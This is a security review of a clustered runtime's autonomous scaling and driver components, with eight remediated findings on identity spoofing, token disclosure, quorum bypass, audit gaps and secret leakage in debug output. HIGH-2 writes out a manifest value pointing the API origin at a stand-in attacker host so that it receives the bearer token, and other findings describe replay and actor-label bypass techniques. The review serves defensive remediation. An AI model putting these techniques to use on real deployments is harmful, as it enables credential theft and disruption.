# Security Review — Autonomous scaling and load balancing

Review date: 2026-07-16

Scope: protocol-two node identity and transport, operator control, external Docker driver service, Process/Docker/Fly capacity drivers, credential handling, replay protection, and audit redaction. The PostgreSQL application schema and unrelated website code are out of scope.

## Summary

The core design has strong foundations: autonomous nodes require mTLS and signed cluster-scoped identities, control changes are HMAC-authenticated and normally majority-committed, provider mutations are idempotent and metadata-fenced, frames and caches are bounded, and secrets have dedicated rotation paths. The review found three high-severity trust-boundary defects and five medium/low hardening defects. All eight findings have been remediated and verified by focused tests; the time-bound 24-hour soak and credentialed Fly staging gate remain release-evidence requirements, not unresolved findings in this review.

## Findings

### HIGH-1: Protocol-one transient route channel bypasses reservation and attempt fencing

**Location:** `compiler/mesh-rt/src/dist/identity_claim.rs` (signed-name verification) and `compiler/mesh-rt/src/dist/node.rs` (`transient_http_route_compatibility_allowed`, `handle_transient_http_route_connection`, and the accepted-session dispatch)

**Category:** Spoofing / Tampering / Elevation of privilege

**Exploit:** The identity verifier permits any signed non-operator claim to connect under a `mesh-http-route@...` name even when that name does not match the claim. The accept loop sends that connection to the protocol-one one-shot route handler. Unlike the persistent protocol-two route path, this handler does not reserve admission or prove that the caller owns the current dispatch; it invokes the application handler first and checks completion afterward. A compromised authenticated worker can reuse a visible request key and attempt ID to execute a mutating handler more than once before completion rejects the stale result.

**Reachability:** Adjacent authenticated cluster node with a valid worker identity, mTLS credential, and cluster cookie.

**Impact:** Duplicate application mutations and violation of the continuity/idempotency guarantee.

**Remediation:** Reject the transient route identity in autonomous mode and remove its advertised-name exception. Keep protocol-one compatibility only in manual mode, where it must still pass the normal cookie boundary. Add an autonomous rejection test.

**Status:** Remediated and verified. Autonomous sessions reject the transient route identity; only explicit manual protocol-one compatibility retains it. Regression coverage verifies the autonomous rejection and the fenced persistent route path.

### HIGH-2: Custom Fly API origin can receive the production bearer token

**Location:** `compiler/mesh-pkg/src/autonomous.rs` (Fly manifest validation), `compiler/mesh-rt/src/dist/autonomous.rs` (`RuntimeCapacityDriverConfig`), and `compiler/mesh-rt/src/dist/scaling.rs` (`FlyMachinesCapacityDriver` origin validation and request adapter)

**Category:** Information disclosure / SSRF

**Exploit:** `api_base_url` is deployment-manifest controlled and validation only requires an `https://` prefix. The HTTP adapter attaches `Authorization: Bearer <Fly token>` to every request. A malicious or compromised manifest can set `api_base_url = "https://attacker.example"`; controller startup then sends the Fly token to that origin during configuration validation.

**Reachability:** Deployment-author or supply-chain access to the Mesh manifest; no running-cluster credential is required.

**Impact:** Fly account credential disclosure and subsequent capacity takeover within the token's scope.

**Remediation:** Pin the production origin to `https://api.machines.dev`. Permit a custom HTTPS origin only behind an explicit process-owner environment opt-in intended for isolated tests, and document that the opt-in forwards the token. Add manifest/runtime validation tests.

**Status:** Remediated and verified. Manifest defaults and runtime validation pin `https://api.machines.dev`; no request is issued to an unapproved origin unless the process owner explicitly enables the documented test-only override. `fly_manifest_origin_is_pinned_before_token_lookup` and `fly_driver_conformance_rejects_token_forwarding_to_unapproved_origin` cover both boundaries.

### HIGH-3: Reserved actor string bypasses controller quorum for drain admission

**Location:** `compiler/mesh-rt/src/dist/operator.rs` (`prepare_committed_drain`, `set_runtime_drain_intent`, and authenticated control application)

**Category:** Spoofing / Elevation of privilege / Denial of service

**Exploit:** Any holder of the operator HMAC key chooses the signed `actor` string. Setting it to `mesh-drain-propagator` activates a special branch that changes local admission state without a consensus commit. During a minority partition, an operator-key holder can send this request directly to a node and drain or undrain it even though the majority control plane cannot commit the action.

**Reachability:** Authenticated operator-key holder able to reach a cluster node.

**Impact:** Quorum-safety violation and targeted service disruption.

**Remediation:** Bind propagation to a majority-committed drain intent and the authenticated controller identity, rather than trusting an actor label. On the target, accept the local fence only if the corresponding committed consensus entry is already visible; otherwise reject and audit it.

**Status:** Remediated and verified. The internal propagation branch now requires an authenticated protocol-two controller session in addition to the signed internal request; an operator-supplied actor label alone is rejected. `internal_drain_actor_requires_authenticated_controller_session` covers the confused-deputy boundary.

### MEDIUM-4: External Docker service pins image and pool but trusts the first network/environment template

**Location:** `compiler/mesh-rt/src/dist/driver_service.rs` (`DockerDriverService::driver`)

**Category:** Elevation of privilege / Information disclosure

**Exploit:** The socket-bearing service validates `image` and `pool`, then accepts the first authenticated request's arbitrary Docker network and environment as its cached template. A compromised controller possessing the driver credential can attach the fixed worker image to a sensitive Docker network or inject behavior-changing environment values. The driver service exists specifically to keep Docker-root authority narrower than controller authority.

**Reachability:** Compromised authenticated controller/driver client.

**Impact:** Expansion from controller compromise to unintended container-network access or worker configuration.

**Remediation:** Configure an allowed network and exact environment-name set at the driver-service boundary; compare every request before constructing the Docker driver, and reject later template changes. Environment values remain supplied by the separately authenticated controller because per-node identity and endpoint values are intentionally dynamic; the service limits which settings the controller may populate rather than treating the first request as authority.

**Status:** Remediated and verified. The service now fails closed without `MESH_DOCKER_DRIVER_ALLOWED_NETWORK` and `MESH_DOCKER_DRIVER_ALLOWED_ENV_NAMES`, checks the exact network/environment-name shape on every request, and pins the full first accepted template for the service lifetime. `driver_service_rejects_unapproved_network_and_environment_shape` covers the boundary. A controller that holds the driver credential remains trusted to choose values for explicitly allowed names; this is an intentional authority boundary, not Docker-root or arbitrary-network authority.

### MEDIUM-5: Rejected operator controls are not retained in the audit trail

**Location:** `compiler/mesh-rt/src/dist/operator.rs` (`audit_operator_control`, `audit_operator_control_rejection`, and the control query boundary)

**Category:** Repudiation

**Exploit:** Successful controls call `audit_operator_control`, but signature failures, replay attempts, invalid targets, and quorum failures return before an audit entry is recorded. An attacker can repeatedly probe or replay controls while leaving only transient transport error text, contrary to the requirement that unauthorized actions be rejected and audited.

**Reachability:** Any party that reaches the authenticated operator channel; invalid credentials are sufficient for an attempted control.

**Impact:** Missing incident evidence and inability to distinguish misuse from operational failure.

**Remediation:** Wrap control application at the query boundary, emit a bounded redacted rejection diagnostic for every failure, and append a rejection record to the configured audit log without recording signatures or secret material.

**Status:** Remediated and verified. Every control failure at the query boundary emits a bounded `operator_control_rejected` diagnostic and optional append-only audit record containing actor, action, sequence, and reason but no signature. `rejected_operator_control_is_retained_without_signature_material` verifies retention and redaction.

### MEDIUM-6: Debug implementations disclose worker environment values

**Location:** `compiler/mesh-rt/src/dist/driver_service.rs` (`RemoteDockerTemplate` and `RemoteDockerCapacityDriver` debug output) and `compiler/mesh-rt/src/dist/autonomous.rs` (`RuntimeCapacityDriverConfig` debug output)

**Category:** Information disclosure

**Exploit:** `RemoteDockerTemplate` and `RuntimeCapacityDriverConfig` derive `Debug` while containing complete worker environments. `RemoteDockerCapacityDriver::fmt` prints its template. A diagnostic, panic, or future debug log can therefore expose database URLs, application secrets, or identity material even though the concrete Docker and Fly config formatters redact them.

**Reachability:** Local log/diagnostic reader; triggered by ordinary debugging or a panic path.

**Impact:** Credential disclosure in retained logs.

**Remediation:** Implement schema-aware `Debug` that prints environment entry counts/names only, never values. Add secret-sentinel tests.

**Status:** Remediated and verified. Both configuration types now use custom redacting `Debug` implementations. `remote_driver_template_debug_redacts_environment_values` and `runtime_driver_debug_redacts_worker_environment_values` use secret sentinels to prevent regressions.

### LOW-7: Driver-service HMAC comparison is not constant-time

**Location:** `compiler/mesh-rt/src/dist/driver_service.rs` (`signature_matches` and `decode_hex_signature`)

**Category:** Information disclosure / Spoofing

**Exploit:** The driver service recomputes a hexadecimal MAC and compares strings with `==`, which may stop at the first differing byte. mTLS and network jitter make practical exploitation difficult, but this is weaker than the constant-time verification already used by operator controls.

**Reachability:** Adjacent client with a CA-trusted certificate but without the driver shared key.

**Impact:** Theoretical reduction in HMAC authentication strength.

**Remediation:** Decode the supplied hexadecimal signature and compare the fixed-size MAC for every key generation with a constant-time primitive.

**Status:** Remediated and verified. The service decodes signatures to fixed 32-byte arrays and compares them with `subtle::ConstantTimeEq`; malformed lengths and hexadecimal encodings fail closed. The rolling-keyring signature test covers accepted and rejected generations.

### MEDIUM-8: Process-driver diagnostics expose argv and environment values

**Location:** `compiler/mesh-rt/src/dist/scaling.rs` (`ProcessDriverConfig` and `ProcessCapacityDriver` debug output)

**Category:** Information disclosure

**Exploit:** The direct Process driver derived `Debug` over its complete command vector and environment map. A panic, diagnostic, or future debug log could therefore retain command-line credentials, database URLs, or application secrets even though the Docker, Fly, remote-driver, and embedded runtime configurations already redact those values.

**Reachability:** Local log/diagnostic reader; triggered by routine debugging or a panic path when the Process driver is configured.

**Impact:** Secret disclosure from a development or one-host deployment into retained diagnostics.

**Remediation:** Replace derived output with schema-aware `Debug`: retain the executable, argument count, working directory, and environment names while omitting every argument and environment value. Exercise a real argv-based child lifecycle separately so redaction does not hide driver behavior from tests.

**Status:** Remediated and verified. `process_driver_debug_redacts_arguments_and_environment_values` uses argument and environment secret sentinels, and `process_driver_uses_idempotent_argv_lifecycle_without_shell_interpolation` proves ensure, observe, drain, terminate, lookup, and repeated-operation behavior against a real child process.

## Non-findings considered

- Node identity envelopes are size-bounded, Ed25519-verified, cluster-scoped, stable-ID scoped, role-canonicalized, name-bound, and time-bounded.
- Autonomous transport fails closed without complete mTLS material; manual protocol-one fallback is not accepted as an autonomous session.
- Operator signatures cover cluster, actor, sequence, expiry, reason, and typed action; accepted actor sequences reject replay.
- Driver-service frames, concurrent connections, request lifetime, and replay-cache size are bounded.
- Docker and Process drivers use argv arrays rather than shell interpolation.
- Docker adoption checks managed marker, cluster, pool, operation, template, term, and desired revision before reuse; deletion re-inspects managed scope.
- Docker environment files use unpredictable create-new names and owner-only permissions and are removed after create attempts.
- Fly response bodies are bounded and credentials/environment values are redacted by the concrete driver formatter.
- HTTP idempotency keys are printable, trimmed, and limited to 255 bytes before hashing.
- CLI control secrets are no longer accepted in argv; secret files must be regular owner-only files on Unix.

## Out of scope

- Security of Docker Engine, Fly's control plane, PostgreSQL itself, application handlers, and user-authentication policy above Mesh's clustered handler boundary.
- Host compromise, malicious root/process owner, or theft of all current CA, identity-signing, cookie, operator, and driver keys.
